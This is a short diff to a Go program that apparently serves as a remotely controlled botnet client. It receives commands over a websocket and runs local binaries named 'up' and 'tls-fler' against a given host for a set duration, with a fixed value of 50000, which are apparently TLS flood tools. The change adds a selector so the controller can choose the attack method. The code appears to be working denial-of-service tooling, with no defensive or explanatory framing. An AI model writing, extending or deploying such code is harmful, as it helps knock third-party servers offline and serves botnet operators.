@@ -62,10 +62,21 @@ func listen(conn *websocket.Conn) {
 }
 
 func runCommand(cmd Command) {
-	args := []string{cmd.Host, cmd.Duration, "50000"}
-	log.Printf("running: ./up %s %s 50000", cmd.Host, cmd.Duration)
+	var binary string
+	var args []string
 
-	out, err := exec.Command("./up", args...).CombinedOutput()
+	switch strings.ToLower(cmd.Method) {
+	case "tls-fler":
+		binary = "./tls-fler"
+		args = []string{cmd.Host, cmd.Duration, "50000"}
+	default: // tls-raw, up, atau apapun fallback ke ./up
+		binary = "./up"
+		args = []string{cmd.Host, cmd.Duration, "50000"}
+	}
+
+	log.Printf("running: %s %s %s 50000", binary, cmd.Host, cmd.Duration)
+
+	out, err := exec.Command(binary, args...).CombinedOutput()
 	if err != nil {
 		log.Printf("command error: %v\noutput: %s", err, string(out))
 		return
